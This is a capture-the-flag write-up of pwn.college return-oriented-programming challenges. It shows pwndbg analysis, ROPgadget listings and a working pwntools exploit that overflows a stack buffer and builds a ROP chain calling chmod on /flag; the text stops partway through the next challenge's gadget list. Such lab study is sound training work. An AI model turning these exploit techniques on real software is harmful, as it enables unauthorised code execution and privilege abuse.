[LEAK] Your input buffer is located at: 0x7ffd17dc4dc0.
```

These are the things that we need to craft an exploit

- [ ] Location of the buffer
- [ ] Location of the stored return address to `main()`

### Binary Analysis

```
pwndbg> info functions
All defined functions:

Non-debugging symbols:
0x0000000000401000  _init
0x0000000000401080  putchar@plt
0x0000000000401090  puts@plt
0x00000000004010a0  printf@plt
0x00000000004010b0  read@plt
0x00000000004010c0  setvbuf@plt
0x00000000004010d0  _start
0x0000000000401100  _dl_relocate_static_pie
0x0000000000401110  deregister_tm_clones
0x0000000000401140  register_tm_clones
0x0000000000401180  __do_global_dtors_aux
0x00000000004011b0  frame_dummy
0x00000000004011b6  bin_padding
0x0000000000401c1e  free_gadgets
0x0000000000401c69  challenge
0x0000000000401cc0  main
0x0000000000401d80  __libc_csu_init
0x0000000000401df0  __libc_csu_fini
0x0000000000401df8  _fini
```

#### `challenge()`

```
pwndbg> disassemble challenge
Dump of assembler code for function challenge:
   0x0000000000401c69 <+0>:     endbr64
   0x0000000000401c6d <+4>:     push   rbp
   0x0000000000401c6e <+5>:     mov    rbp,rsp
   0x0000000000401c71 <+8>:     sub    rsp,0x70
   0x0000000000401c75 <+12>:    mov    DWORD PTR [rbp-0x54],edi
   0x0000000000401c78 <+15>:    mov    QWORD PTR [rbp-0x60],rsi
   0x0000000000401c7c <+19>:    mov    QWORD PTR [rbp-0x68],rdx
   0x0000000000401c80 <+23>:    lea    rax,[rbp-0x50]
   0x0000000000401c84 <+27>:    mov    rsi,rax
   0x0000000000401c87 <+30>:    lea    rdi,[rip+0x37a]        # 0x402008
   0x0000000000401c8e <+37>:    mov    eax,0x0
   0x0000000000401c93 <+42>:    call   0x4010a0 <printf@plt>
   0x0000000000401c98 <+47>:    lea    rax,[rbp-0x50]
   0x0000000000401c9c <+51>:    mov    edx,0x1000
   0x0000000000401ca1 <+56>:    mov    rsi,rax
   0x0000000000401ca4 <+59>:    mov    edi,0x0
   0x0000000000401ca9 <+64>:    call   0x4010b0 <read@plt>
   0x0000000000401cae <+69>:    mov    DWORD PTR [rbp-0x4],eax
   0x0000000000401cb1 <+72>:    lea    rdi,[rip+0x37e]        # 0x402036
   0x0000000000401cb8 <+79>:    call   0x401090 <puts@plt>
   0x0000000000401cbd <+84>:    nop
   0x0000000000401cbe <+85>:    leave
   0x0000000000401cbf <+86>:    ret
End of assembler dump.
```

Let's set a breakpoint at `challenge+64` when the call to `read@plt` is made.

```
pwndbg> break *(challenge+64)
Breakpoint 1 at 0x401ca9
```

```
pwndbg> run
Starting program: /challenge/stop-pop-and-rop-hard 
###
### Welcome to /challenge/stop-pop-and-rop-hard!
###

[LEAK] Your input buffer is located at: 0x7ffeefcd0a30.


Breakpoint 1, 0x0000000000401ca9 in challenge ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
───────────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────────────────────────────────────
 RAX  0x7ffeefcd0a30 ◂— 0
 RBX  0x401d80 (__libc_csu_init) ◂— endbr64 
 RCX  0
 RDX  0x1000
 RDI  0
 RSI  0x7ffeefcd0a30 ◂— 0
 R8   0x39
 R9   0x39
 R10  0x402032 ◂— 0x7661654c000a0a2e /* '.\n\n' */
 R11  0x246
 R12  0x4010d0 (_start) ◂— endbr64 
 R13  0x7ffeefcd0ba0 ◂— 1
 R14  0
 R15  0
 RBP  0x7ffeefcd0a80 —▸ 0x7ffeefcd0ab0 ◂— 0
 RSP  0x7ffeefcd0a10 ◂— 0
 RIP  0x401ca9 (challenge+64) ◂— call read@plt
────────────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────────────────────────────────────
 ► 0x401ca9 <challenge+64>    call   read@plt                    <read@plt>
        fd: 0 (/dev/pts/1)
        buf: 0x7ffeefcd0a30 ◂— 0
        nbytes: 0x1000
 
   0x401cae <challenge+69>    mov    dword ptr [rbp - 4], eax
   0x401cb1 <challenge+72>    lea    rdi, [rip + 0x37e]           RDI => 0x402036 ◂— 'Leaving!'
   0x401cb8 <challenge+79>    call   puts@plt                    <puts@plt>
 
   0x401cbd <challenge+84>    nop    
   0x401cbe <challenge+85>    leave  
   0x401cbf <challenge+86>    ret    
 
   0x401cc0 <main>            endbr64 
   0x401cc4 <main+4>          push   rbp
   0x401cc5 <main+5>          mov    rbp, rsp
   0x401cc8 <main+8>          sub    rsp, 0x20
─────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp     0x7ffeefcd0a10 ◂— 0
01:0008│-068     0x7ffeefcd0a18 —▸ 0x7ffeefcd0bb8 —▸ 0x7ffeefcd167c ◂— 'SHELL=/run/dojo/bin/bash'
02:0010│-060     0x7ffeefcd0a20 —▸ 0x7ffeefcd0ba8 —▸ 0x7ffeefcd165b ◂— '/challenge/stop-pop-and-rop-hard'
03:0018│-058     0x7ffeefcd0a28 ◂— 0x19275a6a0
04:0020│ rax rsi 0x7ffeefcd0a30 ◂— 0
05:0028│-048     0x7ffeefcd0a38 ◂— 0
06:0030│-040     0x7ffeefcd0a40 —▸ 0x70ab927564a0 (_IO_file_jumps) ◂— 0
07:0038│-038     0x7ffeefcd0a48 —▸ 0x70ab925fb53d (_IO_file_setbuf+13) ◂— test rax, rax
───────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────────────────────────────
 ► 0         0x401ca9 challenge+64
   1         0x401d65 main+165
   2   0x70ab92591083 __libc_start_main+243
   3         0x4010fe _start+46
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

- [x] Location of the buffer: `0x7ffeefcd0a30`
- [ ] Location of the stored return address to `main()`

```
pwndbg> info frame
Stack level 0, frame at 0x7ffeefcd0a90:
 rip = 0x401ca9 in challenge; saved rip = 0x401d65
 called by frame at 0x7ffeefcd0ac0
 Arglist at 0x7ffeefcd0a80, args: 
 Locals at 0x7ffeefcd0a80, Previous frame's sp is 0x7ffeefcd0a90
 Saved registers:
  rbp at 0x7ffeefcd0a80, rip at 0x7ffeefcd0a88
```

- [x] Location of the buffer: `0x7ffeefcd0a30`
- [x] Location of the stored return address to `main()`: `0x7ffeefcd0a88`

Now we can successfully craft.

Let's look at the ROP gadgets which are present in the challenge binary.

```
hacker@return-oriented-programming~stop-pop-and-rop-hard:~$ ROPgadget --binary /challenge/stop-pop-and-rop-hard 
Gadgets information
============================================================
0x00000000004010fd : add ah, dh ; nop ; endbr64 ; ret
0x000000000040112b : add bh, bh ; loopne 0x401195 ; nop ; ret
0x0000000000401c3d : add byte ptr [rax - 0x39], cl ; loopne 0x401c9b ; ret
0x0000000000401c4d : add byte ptr [rax - 0x39], cl ; rol byte ptr [r9 + 0x58], 1 ; ret
0x0000000000401c5d : add byte ptr [rax - 0x39], cl ; ror byte ptr [r15], 5 ; ret
0x0000000000401dec : add byte ptr [rax], al ; add byte ptr [rax], al ; endbr64 ; ret
0x0000000000401d72 : add byte ptr [rax], al ; add byte ptr [rax], al ; leave ; ret
0x0000000000401d73 : add byte ptr [rax], al ; add cl, cl ; ret
0x0000000000401036 : add byte ptr [rax], al ; add dl, dh ; jmp 0x401020
0x000000000040119a : add byte ptr [rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x0000000000401dee : add byte ptr [rax], al ; endbr64 ; ret
0x00000000004010fc : add byte ptr [rax], al ; hlt ; nop ; endbr64 ; ret
0x0000000000401d74 : add byte ptr [rax], al ; leave ; ret
0x000000000040100d : add byte ptr [rax], al ; test rax, rax ; je 0x401016 ; call rax
0x000000000040119b : add byte ptr [rcx], al ; pop rbp ; ret
0x0000000000401199 : add byte ptr cs:[rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x00000000004010fb : add byte ptr cs:[rax], al ; hlt ; nop ; endbr64 ; ret
0x0000000000401d75 : add cl, cl ; ret
0x000000000040112a : add dil, dil ; loopne 0x401195 ; nop ; ret
0x0000000000401038 : add dl, dh ; jmp 0x401020
0x000000000040119c : add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x0000000000401197 : add eax, 0x2ecb ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x0000000000401c63 : add eax, 0x5d9000c3 ; ret
0x0000000000401017 : add esp, 8 ; ret
0x0000000000401016 : add rsp, 8 ; ret
0x0000000000401cbc : call qword ptr [rax + 0xff3c3c9]
0x000000000040103e : call qword ptr [rax - 0x5e1f00d]
0x0000000000401014 : call rax
0x0000000000401c29 : clc ; pop rdx ; ret
0x00000000004011b3 : cli ; jmp 0x401140
0x0000000000401103 : cli ; ret
0x0000000000401dfb : cli ; sub rsp, 8 ; add rsp, 8 ; ret
0x00000000004011b0 : endbr64 ; jmp 0x401140
0x0000000000401100 : endbr64 ; ret
0x0000000000401c59 : enter -0x3ca1, 0 ; add byte ptr [rax - 0x39], cl ; ror byte ptr [r15], 5 ; ret
0x0000000000401dcc : fisttp word ptr [rax - 0x7d] ; ret
0x00000000004010fe : hlt ; nop ; endbr64 ; ret
0x0000000000401012 : je 0x401016 ; call rax
0x0000000000401125 : je 0x401130 ; mov edi, 0x404050 ; jmp rax
0x0000000000401167 : je 0x401170 ; mov edi, 0x404050 ; jmp rax
0x000000000040103a : jmp 0x401020
0x00000000004011b4 : jmp 0x401140
0x0000000000401d68 : jmp 0x401d6c
0x000000000040100b : jmp 0x4840103f
0x000000000040112c : jmp rax
0x0000000000401cbe : leave ; ret
0x000000000040112d : loopne 0x401195 ; nop ; ret
0x0000000000401c41 : loopne 0x401c9b ; ret
0x0000000000401196 : mov byte ptr [rip + 0x2ecb], 1 ; pop rbp ; ret
0x0000000000401c5f : mov dword ptr [rbp - 0x40], 0xc3050f ; nop ; pop rbp ; ret
0x0000000000401d71 : mov eax, 0 ; leave ; ret
0x0000000000401127 : mov edi, 0x404050 ; jmp rax
0x00000000004010ff : nop ; endbr64 ; ret
0x0000000000401cbd : nop ; leave ; ret
0x0000000000401c14 : nop ; nop ; nop ; nop ; nop ; nop ; nop ; nop ; pop rbp ; ret
0x0000000000401c15 : nop ; nop ; nop ; nop ; nop ; nop ; nop ; pop rbp ; ret
0x0000000000401c16 : nop ; nop ; nop ; nop ; nop ; nop ; pop rbp ; ret
0x0000000000401c17 : nop ; nop ; nop ; nop ; nop ; pop rbp ; ret
0x0000000000401c18 : nop ; nop ; nop ; nop ; pop rbp ; ret
0x0000000000401c19 : nop ; nop ; nop ; pop rbp ; ret
0x0000000000401c1a : nop ; nop ; pop rbp ; ret
0x0000000000401c1b : nop ; pop rbp ; ret
0x000000000040112f : nop ; ret
0x00000000004011ac : nop dword ptr [rax] ; endbr64 ; jmp 0x401140
0x0000000000401126 : or dword ptr [rdi + 0x404050], edi ; jmp rax
0x0000000000401c32 : pop r10 ; ret
0x0000000000401ddc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000401dde : pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000401de0 : pop r14 ; pop r15 ; ret
0x0000000000401de2 : pop r15 ; ret
0x0000000000401c52 : pop r8 ; ret
0x0000000000401c3a : pop r9 ; ret
0x0000000000401c42 : pop rax ; ret
0x0000000000401ddb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000401ddf : pop rbp ; pop r14 ; pop r15 ; ret
0x000000000040119d : pop rbp ; ret
0x0000000000401c3b : pop rcx ; ret
0x0000000000401c5a : pop rdi ; ret
0x0000000000401c2a : pop rdx ; ret
0x0000000000401de1 : pop rsi ; pop r15 ; ret
0x0000000000401c4a : pop rsi ; ret
0x0000000000401ddd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000401128 : push rax ; add dil, dil ; loopne 0x401195 ; nop ; ret
0x000000000040101a : ret
0x0000000000401198 : retf
0x0000000000401c50 : rol byte ptr [r9 + 0x58], 1 ; ret
0x0000000000401c51 : rol byte ptr [rcx + 0x58], 1 ; ret
0x0000000000401c60 : ror byte ptr [r15], 5 ; ret
0x0000000000401c61 : ror byte ptr [rdi], 5 ; ret
0x0000000000401011 : sal byte ptr [rdx + rax - 1], 0xd0 ; add rsp, 8 ; ret
0x000000000040105b : sar edi, 0xff ; call qword ptr [rax - 0x5e1f00d]
0x0000000000401dfd : sub esp, 8 ; add rsp, 8 ; ret
0x0000000000401dfc : sub rsp, 8 ; add rsp, 8 ; ret
0x0000000000401c62 : syscall
0x0000000000401010 : test eax, eax ; je 0x401016 ; call rax
0x0000000000401123 : test eax, eax ; je 0x401130 ; mov edi, 0x404050 ; jmp rax
0x0000000000401165 : test eax, eax ; je 0x401170 ; mov edi, 0x404050 ; jmp rax
0x000000000040100f : test rax, rax ; je 0x401016 ; call rax

Unique gadgets found: 98
```

### ROP chain 

We will be doing the same ROP chain in this challenge as the [last level](#rop-chain-3).

### Exploit

```py title="~/script.py" showLineNumbers
from pwn import *

context.arch = 'amd64'

# Initilaize values
pop_rax = 0x401c42
pop_rdi = 0x401c5a
pop_rsi = 0x401c4a
syscall = 0x401c62
buffer_addr = 0x7ffeefcd0a30
ret_addr = 0x7ffeefcd0a88

# Calculate offset
offset = ret_addr - buffer_addr

p = process('/challenge/stop-pop-and-rop-hard')

# Extract the actual buffer address for that specific run
p.recvuntil(b"located at: ")
# Read until the next whitespace or newline to get just the hex
leak_str = p.recvline().strip().decode().strip('.')
buffer_addr = int(leak_str, 16)
print(f"[*] Leaked Buffer Address: {hex(buffer_addr)}")

flag_string = b"/flag\x00\x00\x00" 

payload = flat(
    flag_string,
    b"A" * (offset - len(flag_string)),

    # chmod("/flag", 0o777)
    pop_rdi, buffer_addr,
    pop_rsi, 0o777,
    pop_rax, 90,
    syscall
)

p.sendline(payload)
p.interactive()
```

```
hacker@return-oriented-programming~stop-pop-and-rop-hard:/$ python ~/script.py
[+] Starting local process '/challenge/stop-pop-and-rop-hard': pid 543
[*] Leaked Buffer Address: 0x7ffcb2ba18e0
[*] Switching to interactive mode

[*] Process '/challenge/stop-pop-and-rop-hard' stopped with exit code -11 (SIGSEGV) (pid 543)
Leaving!
[*] Got EOF while reading in interactive
$  
```

```
hacker@return-oriented-programming~stop-pop-and-rop-hard:~$ cat /flag 
pwn.college{sR9w4ikcelRl9slp_7YVUhCbJbD.0FO0MDL4ITM0EzW}
```

&nbsp;

## Stop, Pop and ROP 2 (Easy)

```
hacker@return-oriented-programming~stop-pop-and-rop-ii-easy:/$ /challenge/stop-pop-and-rop2-easy 
###
### Welcome to /challenge/stop-pop-and-rop2-easy!
###

This challenge reads in some bytes, overflows its stack, and allows you to perform a ROP attack. Through this series of
challenges, you will become painfully familiar with the concept of Return Oriented Programming!
```

This time the challenge does not tell us the location of the buffer.
Therefore, we cannot store our string at the beginning of the buffer and use it's address in out ROP chain.

What we can do however, is resuse some string which is already present in the binary.

Let's first understand the binary and get the following information:

- [ ] Location of the buffer
- [ ] Location of the stored return address to `main()`
- [ ] Location of a NULL terminated string

### Binary Analysis

```
pwndbg> info functions
All defined functions:

Non-debugging symbols:
0x0000000000401000  _init
0x00000000004010f0  putchar@plt
0x0000000000401100  __errno_location@plt
0x0000000000401110  puts@plt
0x0000000000401120  cs_free@plt
0x0000000000401130  printf@plt
0x0000000000401140  read@plt
0x0000000000401150  strcmp@plt
0x0000000000401160  cs_disasm@plt
0x0000000000401170  mincore@plt
0x0000000000401180  setvbuf@plt
0x0000000000401190  cs_open@plt
0x00000000004011a0  cs_close@plt
0x00000000004011b0  _start
0x00000000004011e0  _dl_relocate_static_pie
0x00000000004011f0  deregister_tm_clones
0x0000000000401220  register_tm_clones
0x0000000000401260  __do_global_dtors_aux
0x0000000000401290  frame_dummy
0x0000000000401296  DUMP_STACK
0x0000000000401499  print_gadget
0x000000000040168d  print_chain
0x00000000004016fb  bin_padding
0x0000000000401d94  free_gadgets
0x0000000000401ddf  challenge
0x0000000000401f00  main
0x0000000000401fc0  __libc_csu_init
0x0000000000402030  __libc_csu_fini
0x0000000000402038  _fini
```

#### `challenge()`

```
pwndbg> disassemble challenge
Dump of assembler code for function challenge:
   0x0000000000401ddf <+0>:     endbr64
   0x0000000000401de3 <+4>:     push   rbp
   0x0000000000401de4 <+5>:     mov    rbp,rsp
   0x0000000000401de7 <+8>:     sub    rsp,0x60
   0x0000000000401deb <+12>:    mov    DWORD PTR [rbp-0x44],edi
   0x0000000000401dee <+15>:    mov    QWORD PTR [rbp-0x50],rsi
   0x0000000000401df2 <+19>:    mov    QWORD PTR [rbp-0x58],rdx
   0x0000000000401df6 <+23>:    lea    rdi,[rip+0x139b]        # 0x403198
   0x0000000000401dfd <+30>:    call   0x401110 <puts@plt>
   0x0000000000401e02 <+35>:    lea    rdi,[rip+0x1407]        # 0x403210
   0x0000000000401e09 <+42>:    call   0x401110 <puts@plt>
   0x0000000000401e0e <+47>:    mov    rax,rsp
   0x0000000000401e11 <+50>:    mov    QWORD PTR [rip+0x32c8],rax        # 0x4050e0 <sp_>
   0x0000000000401e18 <+57>:    mov    rax,rbp
   0x0000000000401e1b <+60>:    mov    QWORD PTR [rip+0x329e],rax        # 0x4050c0 <bp_>
   0x0000000000401e22 <+67>:    mov    rdx,QWORD PTR [rip+0x3297]        # 0x4050c0 <bp_>
   0x0000000000401e29 <+74>:    mov    rax,QWORD PTR [rip+0x32b0]        # 0x4050e0 <sp_>
   0x0000000000401e30 <+81>:    sub    rdx,rax
   0x0000000000401e33 <+84>:    mov    rax,rdx
   0x0000000000401e36 <+87>:    shr    rax,0x3
   0x0000000000401e3a <+91>:    add    rax,0x2
   0x0000000000401e3e <+95>:    mov    QWORD PTR [rip+0x328b],rax        # 0x4050d0 <sz_>
   0x0000000000401e45 <+102>:   mov    rax,QWORD PTR [rip+0x3274]        # 0x4050c0 <bp_>
   0x0000000000401e4c <+109>:   add    rax,0x8
   0x0000000000401e50 <+113>:   mov    QWORD PTR [rip+0x3281],rax        # 0x4050d8 <rp_>
   0x0000000000401e57 <+120>:   lea    rax,[rbp-0x40]
   0x0000000000401e5b <+124>:   mov    edx,0x1000
   0x0000000000401e60 <+129>:   mov    rsi,rax
   0x0000000000401e63 <+132>:   mov    edi,0x0
   0x0000000000401e68 <+137>:   call   0x401140 <read@plt>
   0x0000000000401e6d <+142>:   mov    DWORD PTR [rbp-0x4],eax
   0x0000000000401e70 <+145>:   mov    eax,DWORD PTR [rbp-0x4]
   0x0000000000401e73 <+148>:   cdqe
   0x0000000000401e75 <+150>:   lea    rcx,[rbp-0x40]
   0x0000000000401e79 <+154>:   mov    rdx,QWORD PTR [rip+0x3258]        # 0x4050d8 <rp_>
   0x0000000000401e80 <+161>:   sub    rcx,rdx
   0x0000000000401e83 <+164>:   mov    rdx,rcx
   0x0000000000401e86 <+167>:   add    rax,rdx
   0x0000000000401e89 <+170>:   shr    rax,0x3
   0x0000000000401e8d <+174>:   mov    rdx,rax
   0x0000000000401e90 <+177>:   mov    eax,DWORD PTR [rbp-0x4]
   0x0000000000401e93 <+180>:   mov    esi,eax
   0x0000000000401e95 <+182>:   lea    rdi,[rip+0x13dc]        # 0x403278
   0x0000000000401e9c <+189>:   mov    eax,0x0
   0x0000000000401ea1 <+194>:   call   0x401130 <printf@plt>
   0x0000000000401ea6 <+199>:   lea    rdi,[rip+0x1403]        # 0x4032b0
   0x0000000000401ead <+206>:   call   0x401110 <puts@plt>
   0x0000000000401eb2 <+211>:   lea    rdi,[rip+0x145f]        # 0x403318
   0x0000000000401eb9 <+218>:   call   0x401110 <puts@plt>
   0x0000000000401ebe <+223>:   mov    eax,DWORD PTR [rbp-0x4]
   0x0000000000401ec1 <+226>:   cdqe
   0x0000000000401ec3 <+228>:   lea    rcx,[rbp-0x40]
   0x0000000000401ec7 <+232>:   mov    rdx,QWORD PTR [rip+0x320a]        # 0x4050d8 <rp_>
   0x0000000000401ece <+239>:   sub    rcx,rdx
   0x0000000000401ed1 <+242>:   mov    rdx,rcx
   0x0000000000401ed4 <+245>:   add    rax,rdx
   0x0000000000401ed7 <+248>:   shr    rax,0x3
   0x0000000000401edb <+252>:   add    eax,0x1
   0x0000000000401ede <+255>:   mov    edx,eax
   0x0000000000401ee0 <+257>:   mov    rax,QWORD PTR [rip+0x31f1]        # 0x4050d8 <rp_>
   0x0000000000401ee7 <+264>:   mov    esi,edx
   0x0000000000401ee9 <+266>:   mov    rdi,rax
   0x0000000000401eec <+269>:   call   0x40168d <print_chain>
   0x0000000000401ef1 <+274>:   lea    rdi,[rip+0x1462]        # 0x40335a
   0x0000000000401ef8 <+281>:   call   0x401110 <puts@plt>
   0x0000000000401efd <+286>:   nop
   0x0000000000401efe <+287>:   leave
   0x0000000000401eff <+288>:   ret
End of assembler dump.
```

Let's set a breakpoint at the address where `read@plt` is called.

```
pwndbg> break *(challenge+137)
Breakpoint 1 at 0x401e68
```

```
pwndbg> run
Starting program: /challenge/stop-pop-and-rop2-easy 
###
### Welcome to /challenge/stop-pop-and-rop2-easy!
###

This challenge reads in some bytes, overflows its stack, and allows you to perform a ROP attack. Through this series of
challenges, you will become painfully familiar with the concept of Return Oriented Programming!


Breakpoint 1, 0x0000000000401e68 in challenge ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
───────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────────────────────────
 RAX  0x7ffd2b5e9be0 —▸ 0x7bff6bc556a0 (_IO_2_1_stdout_) ◂— 0xfbad2887
 RBX  0x401fc0 (__libc_csu_init) ◂— endbr64 
 RCX  0x7bff6bb76297 (write+23) ◂— cmp rax, -0x1000 /* 'H=' */
 RDX  0x1000
 RDI  0
 RSI  0x7ffd2b5e9be0 —▸ 0x7bff6bc556a0 (_IO_2_1_stdout_) ◂— 0xfbad2887
 R8   0x61
 R9   0x32
 R10  0x4005b3 ◂— 0x72616863747570 /* 'putchar' */
 R11  0x246
 R12  0x4011b0 (_start) ◂— endbr64 
 R13  0x7ffd2b5e9d40 ◂— 1
 R14  0
 R15  0
 RBP  0x7ffd2b5e9c20 —▸ 0x7ffd2b5e9c50 ◂— 0
 RSP  0x7ffd2b5e9bc0 —▸ 0x7bff6ba65740 ◂— 0x7bff6ba65740
 RIP  0x401e68 (challenge+137) ◂— call read@plt
────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────────────────────────
 ► 0x401e68 <challenge+137>    call   read@plt                    <read@plt>
        fd: 0 (/dev/pts/1)
        buf: 0x7ffd2b5e9be0 —▸ 0x7bff6bc556a0 (_IO_2_1_stdout_) ◂— 0xfbad2887
        nbytes: 0x1000
 
   0x401e6d <challenge+142>    mov    dword ptr [rbp - 4], eax
   0x401e70 <challenge+145>    mov    eax, dword ptr [rbp - 4]
   0x401e73 <challenge+148>    cdqe   
   0x401e75 <challenge+150>    lea    rcx, [rbp - 0x40]
   0x401e79 <challenge+154>    mov    rdx, qword ptr [rip + 0x3258]     RDX, [rp_]
   0x401e80 <challenge+161>    sub    rcx, rdx
   0x401e83 <challenge+164>    mov    rdx, rcx
   0x401e86 <challenge+167>    add    rax, rdx
   0x401e89 <challenge+170>    shr    rax, 3
   0x401e8d <challenge+174>    mov    rdx, rax
─────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp     0x7ffd2b5e9bc0 —▸ 0x7bff6ba65740 ◂— 0x7bff6ba65740
01:0008│-058     0x7ffd2b5e9bc8 —▸ 0x7ffd2b5e9d58 —▸ 0x7ffd2b5eb683 ◂— 'SHELL=/run/dojo/bin/bash'
02:0010│-050     0x7ffd2b5e9bd0 —▸ 0x7ffd2b5e9d48 —▸ 0x7ffd2b5eb661 ◂— '/challenge/stop-pop-and-rop2-easy'
03:0018│-048     0x7ffd2b5e9bd8 ◂— 0x16baf8e93
04:0020│ rax rsi 0x7ffd2b5e9be0 —▸ 0x7bff6bc556a0 (_IO_2_1_stdout_) ◂— 0xfbad2887
05:0028│-038     0x7ffd2b5e9be8 ◂— 0xa /* '\n' */
06:0030│-030     0x7ffd2b5e9bf0 —▸ 0x405090 (stdout@@GLIBC_2.2.5) —▸ 0x7bff6bc556a0 (_IO_2_1_stdout_) ◂— 0xfbad2887
07:0038│-028     0x7ffd2b5e9bf8 —▸ 0x7bff6baee302 (putchar+130) ◂— mov r8d, eax
───────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────────────────
 ► 0         0x401e68 challenge+137
   1         0x401fa5 main+165
   2   0x7bff6ba8c083 __libc_start_main+243
   3         0x4011de _start+46
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

- [x] Location of the buffer: `0x7ffd2b5e9be0` 
- [ ] Location of the stored return address to `main()`
- [ ] Location of a NULL terminated string

```
pwndbg> info frame
Stack level 0, frame at 0x7ffd2b5e9c30:
 rip = 0x401e68 in challenge; saved rip = 0x401fa5
 called by frame at 0x7ffd2b5e9c60
 Arglist at 0x7ffd2b5e9c20, args: 
 Locals at 0x7ffd2b5e9c20, Previous frame's sp is 0x7ffd2b5e9c30
 Saved registers:
  rbp at 0x7ffd2b5e9c20, rip at 0x7ffd2b5e9c28
```

- [x] Location of the buffer: `0x7ffd2b5e9be0` 
- [x] Location of the stored return address to `main()`: `0x7ffd2b5e9c28`
- [ ] Location of a NULL terminated string

Now, let's look at the ROP gadgets that we have at our disposal.

```
hacker@return-oriented-programming~stop-pop-and-rop-ii-easy:~$ ROPgadget --binary /challenge/stop-pop-and-rop2-easy 
Gadgets information
============================================================
0x0000000000401687 : adc eax, 0xc9fffffb ; ret
0x00000000004011dd : add ah, dh ; nop ; endbr64 ; ret
0x0000000000401487 : add al, ch ; cmp esp, -1 ; call qword ptr [rax - 0x179a72b8]
0x000000000040120b : add bh, bh ; loopne 0x401275 ; nop ; ret
0x0000000000401e2f : add byte ptr [rax + 0x29], cl ; ret 0x8948
0x0000000000401e7f : add byte ptr [rax + 0x29], cl ; ror dword ptr [rax - 0x77], 1 ; retf 0x148
0x000000000040156f : add byte ptr [rax - 0x39], cl ; clc ; add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x401608
0x0000000000401db3 : add byte ptr [rax - 0x39], cl ; loopne 0x401dfa ; pop rax ; ret
0x0000000000401504 : add byte ptr [rax - 0x77], cl ; iretd
0x0000000000401502 : add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; iretd
0x00000000004012f2 : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x401470
0x000000000040202c : add byte ptr [rax], al ; add byte ptr [rax], al ; endbr64 ; ret
0x00000000004012f4 : add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x401470
0x0000000000401574 : add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x401608
0x000000000040163f : add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x40166f
0x00000000004016bd : add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x4016e6
0x0000000000401fb2 : add byte ptr [rax], al ; add byte ptr [rax], al ; leave ; ret
0x0000000000401fb3 : add byte ptr [rax], al ; add cl, cl ; ret
0x0000000000401036 : add byte ptr [rax], al ; add dl, dh ; jmp 0x401020
0x000000000040127a : add byte ptr [rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x000000000040202e : add byte ptr [rax], al ; endbr64 ; ret
0x00000000004011dc : add byte ptr [rax], al ; hlt ; nop ; endbr64 ; ret
0x00000000004012f6 : add byte ptr [rax], al ; jmp 0x401470
0x0000000000401576 : add byte ptr [rax], al ; jmp 0x401608
0x0000000000401641 : add byte ptr [rax], al ; jmp 0x40166f
0x00000000004016bf : add byte ptr [rax], al ; jmp 0x4016e6
0x0000000000401fb4 : add byte ptr [rax], al ; leave ; ret
0x000000000040100d : add byte ptr [rax], al ; test rax, rax ; je 0x401016 ; call rax
0x000000000040127b : add byte ptr [rcx], al ; pop rbp ; ret
0x0000000000401279 : add byte ptr ds:[rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x00000000004011db : add byte ptr ds:[rax], al ; hlt ; nop ; endbr64 ; ret
0x0000000000401fb5 : add cl, cl ; ret
0x000000000040120a : add dil, dil ; loopne 0x401275 ; nop ; ret
0x0000000000401038 : add dl, dh ; jmp 0x401020
0x000000000040127c : add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x00000000004012ef : add eax, 0x3db8 ; add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x401470
0x0000000000401277 : add eax, 0x3e2b ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x0000000000401db1 : add eax, 0xc74800c3 ; loopne 0x401dfa ; pop rax ; ret
0x0000000000401085 : add eax, 0xf2000000 ; jmp 0x401020
0x0000000000401e8c : add ecx, dword ptr [rax - 0x77] ; ret 0x458b
0x0000000000401017 : add esp, 8 ; ret
0x0000000000401016 : add rsp, 8 ; ret
0x00000000004016f7 : call qword ptr [rax + 0xff3c3c9]
0x000000000040148c : call qword ptr [rax - 0x179a72b8]
0x000000000040103e : call qword ptr [rax - 0x5e1f00d]
0x0000000000401014 : call rax
0x0000000000401573 : clc ; add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x401608
0x0000000000401d9f : clc ; pop rax ; ret
0x00000000004016bc : cld ; add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x4016e6
0x0000000000401293 : cli ; jmp 0x401220
0x00000000004011e3 : cli ; ret
0x000000000040203b : cli ; sub rsp, 8 ; add rsp, 8 ; ret
